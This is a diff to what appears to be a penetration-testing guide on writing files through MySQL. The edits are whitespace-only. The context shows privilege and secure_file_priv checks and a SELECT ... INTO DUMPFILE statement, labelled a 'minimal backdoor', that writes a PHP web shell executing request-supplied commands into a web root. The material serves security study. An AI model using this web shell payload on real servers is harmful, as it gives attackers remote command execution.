@@ -49,8 +49,8 @@ Before attempting to write files, check if the current user has the necessary pr
 SELECT File_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1);
 
 -- Option 2: Check through information_schema (more commonly accessible)
-SELECT 1 FROM information_schema.user_privileges 
-WHERE grantee LIKE CONCAT("'", SUBSTRING_INDEX(USER(), '@', 1), "'@%") 
+SELECT 1 FROM information_schema.user_privileges
+WHERE grantee LIKE CONCAT("'", SUBSTRING_INDEX(USER(), '@', 1), "'@%")
 AND privilege_type = 'FILE';
 ```
 
@@ -63,6 +63,7 @@ SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
 Results:
+
 - Empty value: You can read/write anywhere
 - NULL: You cannot read/write any files
 - Directory path: You can only read/write in that directory
@@ -141,7 +142,7 @@ Common writable directories:
 SHOW VARIABLES LIKE 'secure_file_priv';
 
 -- Write a minimal backdoor
-SELECT '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; } ?>' 
+SELECT '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; } ?>'
 INTO DUMPFILE '/var/www/html/images/1.php';
 ```
 
